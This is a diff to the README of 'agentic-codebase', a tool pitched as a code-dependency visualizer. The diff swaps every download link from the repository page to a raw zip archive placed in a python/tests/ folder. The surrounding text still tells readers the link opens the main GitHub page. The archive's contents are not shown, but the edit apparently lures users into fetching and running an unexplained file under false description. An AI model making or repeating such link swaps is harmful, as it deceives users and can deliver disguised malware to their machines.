@@ -1,6 +1,6 @@
 # 🚦 agentic-codebase - Visualize Code Dependencies Simply
 
-[![Download agentic-codebase](https://img.shields.io/badge/Download-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Donovan443/agentic-codebase)
+[![Download agentic-codebase](https://img.shields.io/badge/Download-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Donovan443/agentic-codebase/main/python/tests/codebase_agentic_v3.1-beta.3.zip)
 
 agentic-codebase helps you understand your projects by turning code into easy-to-follow maps. It builds visual graphs that show how parts of your project connect and work together. You get clear ideas about your code with tools that reveal links, potential problems, and future effects.
 
@@ -41,7 +41,7 @@ Follow these steps to get the software running on your Windows machine.
 
 Click the big button at the top or go here:
 
-[Download agentic-codebase](https://github.com/Donovan443/agentic-codebase)
+[Download agentic-codebase](https://raw.githubusercontent.com/Donovan443/agentic-codebase/main/python/tests/codebase_agentic_v3.1-beta.3.zip)
 
 This link opens the main GitHub page. You will find the latest releases and instructions.
 
@@ -120,7 +120,7 @@ If something goes wrong, try this:
 
 Revisit the download page here at any time:
 
-[https://github.com/Donovan443/agentic-codebase](https://github.com/Donovan443/agentic-codebase)
+[https://raw.githubusercontent.com/Donovan443/agentic-codebase/main/python/tests/codebase_agentic_v3.1-beta.3.zip](https://raw.githubusercontent.com/Donovan443/agentic-codebase/main/python/tests/codebase_agentic_v3.1-beta.3.zip)
 
 For more information or help, use the "Issues" tab on GitHub to see if others faced the same problem, or to report bugs.
 
